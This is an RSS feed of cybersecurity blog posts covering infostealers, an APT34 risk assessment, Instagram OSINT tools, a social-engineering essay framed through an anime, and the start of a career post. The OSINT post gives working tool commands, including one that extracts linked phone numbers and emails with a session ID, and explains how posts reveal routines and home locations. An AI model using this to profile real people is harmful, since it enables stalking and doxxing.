<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xsl" href="rss.xsl"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <title>paigehai Blog</title>
        <link>https://paigehai.github.io/blog</link>
        <description>paigehai Blog</description>
        <lastBuildDate>Tue, 28 Oct 2025 00:00:00 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[What are infostealers?]]></title>
            <link>https://paigehai.github.io/blog/what-are-infostealers</link>
            <guid>https://paigehai.github.io/blog/what-are-infostealers</guid>
            <pubDate>Tue, 28 Oct 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[<img]]></description>
            <content:encoded><![CDATA[<div style="text-align:center"><img src="https://paigehai.github.io/blog/infostealers-thumb.png" alt="Infostealers Thumbnail" style="width:100%;max-width:500px;height:auto"></div>
<p>Threat actors have shifted their focus from large-scale ransomware attacks to more subtle and persistent threats. One that you may have seen on news sites  or on LinkedIn are infostealers. This post dicusses hwo these malicious programs are designed to discreetly harvest sensitive data from an infected system.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="how-infostealers-operate">How Infostealers Operate<a href="https://paigehai.github.io/blog/what-are-infostealers#how-infostealers-operate" class="hash-link" aria-label="Direct link to How Infostealers Operate" title="Direct link to How Infostealers Operate" translate="no">​</a></h3>
<p>Info-stealers typically operate in a four-stage process[1]: delivery, data collection, data exfiltration, and data distribution. Each phase helps the attacker successfully obtain and commercialise stolen information.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="delivery-stage">Delivery Stage<a href="https://paigehai.github.io/blog/what-are-infostealers#delivery-stage" class="hash-link" aria-label="Direct link to Delivery Stage" title="Direct link to Delivery Stage" translate="no">​</a></h4>
<p>The first step is delivery and this defines how the info-stealer finds its way into a target system. Any weak point in a system can lead to the network being popped. Attackers use several methods to execute delivery, including:</p>
<ul>
<li class="">Phishing emails containing malicious attachments or links.</li>
<li class="">Drive-by downloads from compromised or fake websites.</li>
<li class="">Cracked software or “free” downloads that secretly contain malware.</li>
<li class="">Malvertising, where malicious ads redirect users to exploit kits.</li>
</ul>
<p>Once the payload is delivered, it’s obfuscated or encrypted to bypass your traditional antivirus and endpoint protection tools. The info-stealer will subsequently discreetly install itself in the background, unbeknownst to the user.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="data-collection">Data Collection<a href="https://paigehai.github.io/blog/what-are-infostealers#data-collection" class="hash-link" aria-label="Direct link to Data Collection" title="Direct link to Data Collection" translate="no">​</a></h4>
<p>Once active, the malware begins collecting information. Common targets include:</p>
<ul>
<li class="">Saved passwords from browsers and applications.</li>
<li class="">Cookies and session tokens that can allow account hijacking.</li>
<li class="">System information, such as OS version and hardware details.</li>
<li class="">Clipboard data, often used to capture cryptocurrency wallet addresses.</li>
</ul>
<p>Some advanced info-stealers may be able to take desktop screenshots or record keystrokes (keylogging) to capture even more of your data (anything and everything is valuable to these people!).</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="data-exfiltration">Data Exfiltration<a href="https://paigehai.github.io/blog/what-are-infostealers#data-exfiltration" class="hash-link" aria-label="Direct link to Data Exfiltration" title="Direct link to Data Exfiltration" translate="no">​</a></h4>
<p>After gathering sensitive information, the malware moves into the exfiltration stage where it sends the data back to the threat actor. This may occur over encrypted channels to evade detection with common techniques including:</p>
<ul>
<li class="">Using HTTP(S) POST requests to attacker-controlled servers.</li>
<li class="">Uploading data via FTP or Telegram bots.</li>
<li class="">Storing information temporarily in cloud storage or paste sites before retrieval.</li>
</ul>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="data-distribution">Data Distribution<a href="https://paigehai.github.io/blog/what-are-infostealers#data-distribution" class="hash-link" aria-label="Direct link to Data Distribution" title="Direct link to Data Distribution" translate="no">​</a></h4>
<p>The final phase is data distribution, where the stolen information is monetised. The stolen data might be:</p>
<ul>
<li class="">Sold on dark web marketplaces in bulk credential dumps.</li>
<li class="">Used directly for fraud, account takeovers, or identity theft.</li>
<li class="">Shared among threat actors for further exploitation or phishing campaigns.</li>
</ul>
<p>For cybercriminals, info-stealers provide a high return on investment as there are likely low risk, quick profits, and a steady stream of usable credentials.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-impact-of-infostealers">The Impact of Infostealers<a href="https://paigehai.github.io/blog/what-are-infostealers#the-impact-of-infostealers" class="hash-link" aria-label="Direct link to The Impact of Infostealers" title="Direct link to The Impact of Infostealers" translate="no">​</a></h3>
<p>The consequences of info-stealers are significant not only for individuals but also for entire organisations.</p>
<p>For end-users this can manifest into compromised accounts (email, banking, social media), financial loss and identity theft, and straight up privacy invasion and potential reputational damage.</p>
<p>For organisations, this takes the form of unauthorised access to internal systems, data breaches leading to compliance violations (such as GDPR, or HIPAA), financial and operational disruptions, and brand and trust erosion if employee credentials are leaked.</p>
<p>Both end-users and organisations should pay attention to the above indicators of compromise (IoCs) which will allow you to act proactively before any repercussions are observed.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="so-how-can-i-protect-myself">So, How Can I Protect Myself?<a href="https://paigehai.github.io/blog/what-are-infostealers#so-how-can-i-protect-myself" class="hash-link" aria-label="Direct link to So, How Can I Protect Myself?" title="Direct link to So, How Can I Protect Myself?" translate="no">​</a></h3>
<p>Protecting against info-stealers requires a mix of technical controls, user awareness, and policy enforcement.
Effective measures in protecting against infostealers that you may want to consider implementing include:</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-strengthening-your-browser-and-system-security-by">1. Strengthening your browser and system security by:<a href="https://paigehai.github.io/blog/what-are-infostealers#1-strengthening-your-browser-and-system-security-by" class="hash-link" aria-label="Direct link to 1. Strengthening your browser and system security by:" title="Direct link to 1. Strengthening your browser and system security by:" translate="no">​</a></h4>
<ul>
<li class="">Blocking malicious or unauthorised extensions in Microsoft Edge and Google Chrome using Group Policy or Intune.</li>
<li class="">Disabling password saving and credit card autofill in your browser to limit stored sensitive data.</li>
<li class="">Disabling automatic downloads to prevent silent malware installation.</li>
<li class="">Always using secure connections (HTTPS) to protect data in transit.</li>
</ul>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-harden-endpoint-protections-by">2. Harden endpoint protections by:<a href="https://paigehai.github.io/blog/what-are-infostealers#2-harden-endpoint-protections-by" class="hash-link" aria-label="Direct link to 2. Harden endpoint protections by:" title="Direct link to 2. Harden endpoint protections by:" translate="no">​</a></h4>
<ul>
<li class="">Blocking Credential Stealing from LSASS (via Attack Surface Reduction - ASR) to prevent malware from extracting stored credentials.</li>
<li class="">Blocking script-based execution (ASR) to stop malicious PowerShell, VBScript, or JavaScript from running.</li>
<li class="">Enforcing an Account Lockout Policy to prevent brute-force or credential-stuffing attacks.</li>
</ul>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-strengthen-authentication-by">3. Strengthen authentication by:<a href="https://paigehai.github.io/blog/what-are-infostealers#3-strengthen-authentication-by" class="hash-link" aria-label="Direct link to 3. Strengthen authentication by:" title="Direct link to 3. Strengthen authentication by:" translate="no">​</a></h4>
<ul>
<li class="">Enabling Multi-Factor Authentication (MFA) across all key accounts (Gmail, Outlook, WhatsApp, and others).</li>
<li class="">Disabling browser password managers, opting instead for a secure, standalone password manager with encryption.</li>
</ul>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="4-policy-and-awareness-by">4. Policy and awareness by:<a href="https://paigehai.github.io/blog/what-are-infostealers#4-policy-and-awareness-by" class="hash-link" aria-label="Direct link to 4. Policy and awareness by:" title="Direct link to 4. Policy and awareness by:" translate="no">​</a></h4>
<ul>
<li class="">Regularly training users to recognise phishing attempts and suspicious downloads.</li>
<li class="">Monitoring for unusual login activity or credential reuse across systems.</li>
<li class="">Keeping systems, browsers, and plugins up to date to patch known vulnerabilities.</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="my-final-thoughts">My Final Thoughts!<a href="https://paigehai.github.io/blog/what-are-infostealers#my-final-thoughts" class="hash-link" aria-label="Direct link to My Final Thoughts!" title="Direct link to My Final Thoughts!" translate="no">​</a></h3>
<p>Info-stealers are one of the fastest-growing threats at the moment, and they are all over our news timelines. Their stealth, simplicity, and profitability make them a favorite among threat actors but awareness and preventive action can dramatically lower your exposure. Good cyber security hygiene coupled with modern security tools make it significantly harder for attackers to exploit stolen information.</p>
<p>Your data is your most valuable asset, so protect it as such!</p>
<p>[1] CTM360, “Report | june 2025, infostealers: Whats stolen today may compromise your future tomorrow,” 2025. [Online]. Available: <a href="https://www.ctm360.com/reports/info-stealers-report" target="_blank" rel="noopener noreferrer" class="">https://www.ctm360.com/reports/info-stealers-report</a></p>]]></content:encoded>
            <category>Analysis</category>
            <category>Tools</category>
        </item>
        <item>
            <title><![CDATA[Datacom Cybersecurity Job Simulation Write Up]]></title>
            <link>https://paigehai.github.io/blog/datacom-cybersecurity-job-simulation-write-up</link>
            <guid>https://paigehai.github.io/blog/datacom-cybersecurity-job-simulation-write-up</guid>
            <pubDate>Thu, 09 Oct 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[<img]]></description>
            <content:encoded><![CDATA[<div style="text-align:center"><img src="https://paigehai.github.io/blog/datacom-thumb.png" alt="Datacom Job Simulation Thumbnail" style="width:100%;max-width:500px;height:auto"></div>
<p>Completed a cybersecurity simulation with Datacom, undertaking a risk assessment to identify threats pertaining to APT34, otherwise known as Helix Kitten.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-1-adversary-research-and-ttps">Task 1: Adversary Research and TTP's<a href="https://paigehai.github.io/blog/datacom-cybersecurity-job-simulation-write-up#task-1-adversary-research-and-ttps" class="hash-link" aria-label="Direct link to Task 1: Adversary Research and TTP's" title="Direct link to Task 1: Adversary Research and TTP's" translate="no">​</a></h3>
<p>APT34 is often referred to as Helix Kitten is an adversary who has been active since 2015. It is commonly said that this adversary group is Iranian-aligned[1], targeting aerospace, energy, financial, government, hospitality, and telecommunications industries[2] in the US, UK, China, Turkey, and other countries within the Middle East and North Africa.</p>
<p>Historically, their motivations correspond with Iranian state interests where the group will often strategically focus on exploiting infrastructure frameworks, and intelligence collection, highlighting their commitment to state-sponsored objectives.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="techniques-tactics-and-procedures">Techniques, Tactics, and Procedures<a href="https://paigehai.github.io/blog/datacom-cybersecurity-job-simulation-write-up#techniques-tactics-and-procedures" class="hash-link" aria-label="Direct link to Techniques, Tactics, and Procedures" title="Direct link to Techniques, Tactics, and Procedures" translate="no">​</a></h4>
<p>APT34 leverages custom-developed tools that are ideal for maintaining persistence in target systems. These tools ensure operational flexibility within a range of different contexts. They have exploited vulnerabilities including CVE-2024-30088[3] which is a Windows kernel elevation of privilege vulnerability. They have also been known to exploit Microsoft Exchange servers to obtain sensitive credentials, highlighting their successful lateral movement through the network and privilege escalation capabilities.</p>
<p>This adversary has also been known to implement specialised C2 mechanisms, such as deploying a custom DNS tunnelling protocol, which allows them to extract data and enforce their control over compromised systems. In addition, they utilise email-base C2 channels with compromised accounts as a means of disguising their communication with legitimate traffic.</p>
<p>Their expertise is clear with their ability to create custom-built .NET and PowerShell backdoors, which are notably never recycled. This establishes how they're able to maintain persistence, and adapt to changing environments, posing them as a significant threat to affected countries[4].</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="security-implementations-for-users">Security Implementations for Users<a href="https://paigehai.github.io/blog/datacom-cybersecurity-job-simulation-write-up#security-implementations-for-users" class="hash-link" aria-label="Direct link to Security Implementations for Users" title="Direct link to Security Implementations for Users" translate="no">​</a></h4>
<p>Helix Kitten are known to execute spear-phishing campaigns, so advanced email filtering can be employed to ensure that phishing emails never make it to an employees inbox. Training is incredibly important for staff, as employees will be introduced to the common behaviour patterns of such adversaries. Security staff should enforce mandatory MFA to ensure that credentials alone are not sufficient for logging in to company accounts.</p>
<p>Technically, endpoint security can be implemented with Intrusion-Prevention Systems, and Host-based Intrusion Systems employed to detect (HIDS) and prevent (IPS) potential threats from entering the network. Implementing network segmentation can also assist in preventing potential lateral movement within the network by isolating the threat actor to a single, segmented network.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-2-risk-matrix-and-assessment">Task 2: Risk Matrix and Assessment<a href="https://paigehai.github.io/blog/datacom-cybersecurity-job-simulation-write-up#task-2-risk-matrix-and-assessment" class="hash-link" aria-label="Direct link to Task 2: Risk Matrix and Assessment" title="Direct link to Task 2: Risk Matrix and Assessment" translate="no">​</a></h3>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/Datacom-4.png" alt="Datacom Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:1080px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/Datacom-5.png" alt="Datacom Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:1080px;width:100%;height:auto;border-radius:0"></div>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/Datacom-6.png" alt="Datacom Cyber Job Simulation Thumbnail" class="shadow--md" style="max-width:1080px;width:100%;height:auto;border-radius:0"></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="references">References<a href="https://paigehai.github.io/blog/datacom-cybersecurity-job-simulation-write-up#references" class="hash-link" aria-label="Direct link to References" title="Direct link to References" translate="no">​</a></h4>
<p>[1] CyberWire, "Double-tap ransomware. exim server exposure. oilrig active against saudi arabia, lazarus group against spain. cybersecurity awareness month. notes on a hybrid war." 2023. [Online]. Available: <a href="https://thecyberwire.com/newsletters/daily-briefing/12/188" target="_blank" rel="noopener noreferrer" class="">https://thecyberwire.com/newsletters/daily-briefing/12/188</a></p>
<p>[2] A. M, "Meet crowdstrike’s adversary of the month for november: He-
lix kitten," 2018. [Online]. Available: <a href="https://www.crowdstrike.com/en-us/blog/meet-crowdstrikes-adversary-of-the-month-for-november-helix-kitten/" target="_blank" rel="noopener noreferrer" class="">https://www.crowdstrike.com/en-us/blog/meet-crowdstrikes-adversary-of-the-month-for-november-helix-kitten/</a></p>
<p>[3] NIST, "Cve-2024-30088 detail," 2024. [Online]. Available: <a href="https://nvd.nist.gov/vuln/detail/cve-2024-30088" target="_blank" rel="noopener noreferrer" class="">https://nvd.nist.gov/vuln/detail/cve-2024-30088</a></p>
<p>[4] Trustwave, "Inside apt34 (oilrig): Tools, techniques, and global cyber threats,"
2025. [Online]. Available: <a href="https://www.trustwave.com/en-us/resources/blogs/trustwave-blog/inside-apt34-oilrig-tools-techniques-and-global-cyber-threats/" target="_blank" rel="noopener noreferrer" class="">https://www.trustwave.com/en-us/resources/blogs/trustwave-blog/inside-apt34-oilrig-tools-techniques-and-global-cyber-threats/</a></p>]]></content:encoded>
            <category>Job Simulation</category>
            <category>Write Up</category>
        </item>
        <item>
            <title><![CDATA[What is Really Hidden? Discussing Instagram OSINT Tools]]></title>
            <link>https://paigehai.github.io/blog/what-is-really-hidden-discussing-instagram-osint-tools</link>
            <guid>https://paigehai.github.io/blog/what-is-really-hidden-discussing-instagram-osint-tools</guid>
            <pubDate>Thu, 09 Oct 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[<img]]></description>
            <content:encoded><![CDATA[<div style="text-align:center"><img src="https://paigehai.github.io/blog/ig-thumb.png" alt="Instagram OSINT Thumbnail" style="width:100%;max-width:500px;height:auto"></div>
<p>How Instagram OSINT tools and public profiles can reveal personal data to anyone who knows where to look.</p>
<p>Admittedly, I have utilised my hardcore OSINT skills to dig up information about people online. To clarify, this was purely experimental, and fully legal, you're going to just have to trust me. In these moments, I learned the sheer volume of personal data that can be pulled from publicly available information.</p>
<p>Let's talk Instagram. From usernames, location data, stories, and meta-data, a threat actor can extract a ton of information about you from your account, potentially utilising it for malicious purposes.</p>
<p>From just a profile, you can often gather:</p>
<ul>
<li class="">Email addresses and phone numbers (if linked)</li>
<li class="">Location history from tagged posts</li>
<li class="">Old usernames and account changes</li>
<li class="">Connections to other platforms (like Facebook)</li>
<li class="">Business account info (category, linked emails)</li>
<li class="">Metadata from posts, even private ones if you know where to look</li>
</ul>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/instaloader.png" alt="Jujutsu Kaisen Anime Panel" class="shadow--md" style="max-width:400px;width:100%;height:auto"></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="instaloader">Instaloader<a href="https://paigehai.github.io/blog/what-is-really-hidden-discussing-instagram-osint-tools#instaloader" class="hash-link" aria-label="Direct link to Instaloader" title="Direct link to Instaloader" translate="no">​</a></h4>
<p><a href="https://github.com/instaloader/instaloader" target="_blank" rel="noopener noreferrer" class="">Instaloader</a> is one of the most popular Instagram OSINT tools. It’s a command-line program that lets you download:</p>
<ul>
<li class="">Public and private profiles (private requires login)</li>
<li class="">Posts, stories, highlights, and captions</li>
<li class="">Hashtags and geotagged content</li>
<li class="">Comments and metadata</li>
<li class="">Changes in usernames (helpful for tracking accounts over time)</li>
</ul>
<p>Intelligence specialists can utilise the command</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">instaloader profile &lt;username&gt;</span><br></span></code></pre></div></div>
<p>to build a history of someone's posts, or to keep a copy of content before it gets deleted by the user or by Instagram such as for 24 hour stories. Instaloder provides a way to automate this.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/instagramosint.png" alt="Jujutsu Kaisen Anime Panel" class="shadow--md" style="max-width:400px;width:100%;height:auto"></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="instagramosint">InstagramOSINT<a href="https://paigehai.github.io/blog/what-is-really-hidden-discussing-instagram-osint-tools#instagramosint" class="hash-link" aria-label="Direct link to InstagramOSINT" title="Direct link to InstagramOSINT" translate="no">​</a></h4>
<p>The <a href="https://github.com/sc1341/InstagramOSINT" target="_blank" rel="noopener noreferrer" class="">InstagramOSINT script</a> focuses on pulling account-level details that aren’t obvious just from looking at a profile. It can reveal:</p>
<ul>
<li class="">Full username, display name, and bio</li>
<li class="">Profile picture URL (in full resolution)</li>
<li class="">Number of posts, followers, and following</li>
<li class="">Whether the account is private or verified</li>
<li class="">Connected Facebook accounts</li>
<li class="">If it’s a business account, what category it’s listed under</li>
<li class="">Public photos</li>
</ul>
<p>After the installation of this tool, specialists can run the command</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 main.py --username &lt;username&gt;</span><br></span></code></pre></div></div>
<p>to obtain structured account data without needing to do so manually, which is great for large-scale OSINT investigations.</p>
<p><b>Please note:</b> this tool is now archived and is no longer maintained.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/toutatis.png" alt="Jujutsu Kaisen Anime Panel" class="shadow--md" style="max-width:400px;width:100%;height:auto"></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="toutatis">Toutatis<a href="https://paigehai.github.io/blog/what-is-really-hidden-discussing-instagram-osint-tools#toutatis" class="hash-link" aria-label="Direct link to Toutatis" title="Direct link to Toutatis" translate="no">​</a></h4>
<p>Toutatis digs deeper into sensitive details. With a valid Instagram session ID (basically a cookie from being logged in), it can extract:</p>
<ul>
<li class="">Linked phone numbers</li>
<li class="">Registered email addresses</li>
<li class="">Account IDs</li>
<li class="">Connections to other accounts</li>
</ul>
<p>This tool can be utilised by running the command</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python toutatis.py -u &lt;username&gt; -s &lt;session_id&gt;</span><br></span></code></pre></div></div>
<p>It can marry Instagram accounts with contact details, yet as it utilises session details, it isn't as intuitive as other tools.</p>
<p>Investigators don't even need to use tools to extract information, as Instagram itself can provide plenty of information.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="profile-information">Profile Information<a href="https://paigehai.github.io/blog/what-is-really-hidden-discussing-instagram-osint-tools#profile-information" class="hash-link" aria-label="Direct link to Profile Information" title="Direct link to Profile Information" translate="no">​</a></h4>
<p>Your profile can reveal username patterns that might match across other platforms, ddisplay names that can include full names, nicknames, or initials, bios with links to websites, jobs, or interests, and profile picture in high resolution which can be used to cross-matched your identity on other social media websites.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="usernames-and-ids">Usernames and IDs<a href="https://paigehai.github.io/blog/what-is-really-hidden-discussing-instagram-osint-tools#usernames-and-ids" class="hash-link" aria-label="Direct link to Usernames and IDs" title="Direct link to Usernames and IDs" translate="no">​</a></h4>
<p>Every Instagram account has a unique numeric user ID behind the username. Even if someone changes their username, that ID remains the same. This makes it possible to track old usernames or link multiple accounts to the same person.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="posts-and-metadata">Posts and Metadata<a href="https://paigehai.github.io/blog/what-is-really-hidden-discussing-instagram-osint-tools#posts-and-metadata" class="hash-link" aria-label="Direct link to Posts and Metadata" title="Direct link to Posts and Metadata" translate="no">​</a></h4>
<p>Captions, hashtags, and mentions often point to locations, hobbies, or social circles. Observation of adtes and times of your posts can reveal routines such as when you're typically active online. Geotags can reveal your frequent travel spots, home addresses, or workplaces.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="stories-and-highlights">Stories and Highlights<a href="https://paigehai.github.io/blog/what-is-really-hidden-discussing-instagram-osint-tools#stories-and-highlights" class="hash-link" aria-label="Direct link to Stories and Highlights" title="Direct link to Stories and Highlights" translate="no">​</a></h4>
<p>Even stories can be captured with screenshots, mirrors, and even third-party story viewing tools. Your Highlights serve as a diary of places you've visited, life events, or personal milestones which can all be utilised against you. A threat actor may choose to start gathering information about your day-to-day such as which gym you attend, or local walking paths.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="connections">Connections<a href="https://paigehai.github.io/blog/what-is-really-hidden-discussing-instagram-osint-tools#connections" class="hash-link" aria-label="Direct link to Connections" title="Direct link to Connections" translate="no">​</a></h4>
<p>Follower and following lists can map out someone’s social network. Mutual connections may reveal close friends, employers, or family members. Your tagged photos can lead to additional accounts belonging to the same circle.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="public-search-and-mirrors">Public Search and Mirrors<a href="https://paigehai.github.io/blog/what-is-really-hidden-discussing-instagram-osint-tools#public-search-and-mirrors" class="hash-link" aria-label="Direct link to Public Search and Mirrors" title="Direct link to Public Search and Mirrors" translate="no">​</a></h4>
<p>Instagram content is indexed by search engines, so using Google dorks can uncover cached or mirrored versions of posts. Mirror sites and third-party Instagram viewers often display content without login restrictions, sometimes even after it’s been deleted from the main platform.</p>
<p>Each tool and Instagram itself, provides a unique approach to obtaining information, and when utilised together, they can reveal a LOT of information without even needing an account or access to a private database. When conducting an investigation, they can be very powerful and is a reminder that Instagram is never fully private.</p>
<p>A general rule of thumb always assume that anything you share online could end up in the hands of a threat actor. If that makes you uncomfortable, perhaps it’s best not to post it.</p>]]></content:encoded>
            <category>Analysis</category>
            <category>Tools</category>
        </item>
        <item>
            <title><![CDATA[Jujutsu Kaisen and Shifting the Balance With Social Engineering]]></title>
            <link>https://paigehai.github.io/blog/jujutsu-kaisen-and-shifting-the-balance-with-social-engineering</link>
            <guid>https://paigehai.github.io/blog/jujutsu-kaisen-and-shifting-the-balance-with-social-engineering</guid>
            <pubDate>Sun, 21 Sep 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[<img]]></description>
            <content:encoded><![CDATA[<div style="text-align:center"><img src="https://paigehai.github.io/blog/jjk-thumb.png" alt="Jujutsu Kaisen Thumbnail" style="width:100%;max-width:500px;height:auto"></div>
<p>Bridging anime storytelling and cyber security concepts by analysing how Kenjaku’s impersonation and manipulation mirror real-world social engineering attacks.</p>
<p>Imagine you have just responded to an incident and as you begin investigating you come face-to-face with an old friend. Someone you know intimately. You recognise their mannerisms, their voice, their very presence. Yet, unbeknownst to you, this person is not your friend at all. They are a perfect imitation. They look the same, talk the same, move the same. How could you possibly tell the difference?</p>
<p>In Jujutsu Kaisen Season 2, we witness a striking example of this. While protecting Tokyo, Gojo Satoru rushes to an emergency at Shinjuku Station. After a grueling battle with powerful curses he is physically and mentally drained. Then, seemingly out of nowhere Geto, his best friend long believed dead, appears before him. Gojo exclaims "Your body... and even your cursed energy... my Six Eyes tell me you're Suguru Geto... but my soul knows otherwise!"</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/jjk1.png" alt="Jujutsu Kaisen Anime Panel" class="shadow--md" style="max-width:400px;width:100%;height:auto"></div>
<p>In this moment, Gojo realises something is wrong. He can sense the deception, yet even with the power of his six eyes, he cannot understand why. The consequences are immediate and catastrophic wherein Gojo is sealed within the Prison Realm (Gokumonkyō), and the Jujutsu sorcerers lose their greatest defender. With their strongest gone, the balance of power irrevocably shifts in favour of curses.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/jjk2.png" alt="Kenjaku vs Geto" class="shadow--md" style="max-width:400px;width:100%;height:auto"></div>
<p>Kenjaku's deception mirrors one of the most powerful tools in cyber security. Like Kenjaku exploiting Gojo's trust, threat actors manipulate human behaviour to bypass even the strongest systems. Social engineering is the art of influencing people to gain an advantage, convincing someone to reveal sensitive information, grant access, or take actions that compromise security. Unlike malware or hacking tools it targets people, not systems.</p>
<p>Its effectiveness comes from exploiting trust, authority, urgency, and emotion. A carefully crafted email can mimic a CEO, a phone call can elicit credentials, and a sense of emergency can make even cautious individuals act without thought. Just as Kenjaku weaponises the familiarity of Geto's face, voice, and presence threat actors leverage familiarity and confidence to manipulate targets.</p>
<p>Kenjaku exemplifies social engineering at its most sophisticated. He does not rely on brute force. He exploits trust, familiarity, and perception. By perfectly impersonating Geto, he creates hesitation and doubt even in Gojo, one of the strongest sorcerers alive. This mirrors real-world impersonation attacks such as CEO fraud, spear phishing, and pretexting where threat actors mimic trusted figures to manipulate targets into actions they normally would not take.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/jjk3.png" alt="Dream Team" class="shadow--md" style="max-width:600px;width:100%;height:auto"></div>
<p>The consequences of his manipulation extend beyond individual hesitation. Characters like Itadori, Megumi, Yuta, and Kugisaki are forced to adapt in real-time, stepping into roles for which they may not be fully prepared. The cascading effect destabilises the entire Jujutsu ecosystem showing how the compromise of a single pivotal figure can compromise a network of support.</p>
<p>This mirrors cyber security realities. Many organisations have crown jewels, critical systems or key personnel whose compromise introduces evolving attacks. When threat actors manipulate high-trust individuals or breach central systems, they gain unprecedented leverage. The psychological impact amplifies the technical damage. Hesitation, confusion, and reduced morale make further attacks more likely.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/jjk4.png" alt="Dream Team" class="shadow--md" style="max-width:600px;width:100%;height:auto"></div>
<p>I believe the lesson is clear. In both Jujutsu Kaisen and cyber security, the strength of a system depends on the network of trust and reliance that supports it. Human factors are often the weakest link. Even the most powerful systems, whether Gojo or a secured IT infrastructure, can be undermined if trust is exploited. Vigilance, verification, and contingency planning are essential to prevent a single manipulation from collapsing the entire system, or in Gojo's case from being sealed, leaving everyone vulnerable.</p>]]></content:encoded>
            <category>Reflections</category>
        </item>
        <item>
            <title><![CDATA[How to Turn Academic Success into Career Opportunities]]></title>
            <link>https://paigehai.github.io/blog/how-to-turn-academic-success-into-career-opportunities</link>
            <guid>https://paigehai.github.io/blog/how-to-turn-academic-success-into-career-opportunities</guid>
            <pubDate>Sun, 29 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[<img]]></description>
            <content:encoded><![CDATA[<div style="text-align:center"><img src="https://paigehai.github.io/blog/opportunities-thumb.png" alt="Career Opportunities Thumbnail" style="width:100%;max-width:500px;height:auto"></div>
<p>Built industry readiness as a high-achieving IT student by actively engaging in conferences, university clubs, and tech communities.</p>
<p>It is no secret that it is difficult to get your foot in the door in the IT industry, and as a student it can become quite overwhelming to know where to start. As a second-year student who balances studies with social events and networking, I’ve picked up a wealth of knowledge about the tech industry and discovered practical methods to help you stand out when applying for roles. In this article, I demonstrate that you don’t have to undertake this journey alone, as there are plenty of pathways to build your skills and connections while you study. Read on to find out exactly how you can get started!</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/careers1.png" alt="Conventions" class="shadow--md" style="max-width:600px;width:100%;height:auto"></div>
<p>One of the most valuable things I’ve discovered is the benefit of attending industry conventions and conferences. Although the ticket prices may seem steep, there are many organisations that sponsor students or offer discounted entry to such events. Conventions you may be interested in include CyberCon, BSides, and AusCERT, all of which provide many opportunities to cross paths with some amazing individuals and start some great conversations. I love to think of conventions and conferences as an investment into my future, with connections that may continue to benefit you long after the conclusion of the event.</p>
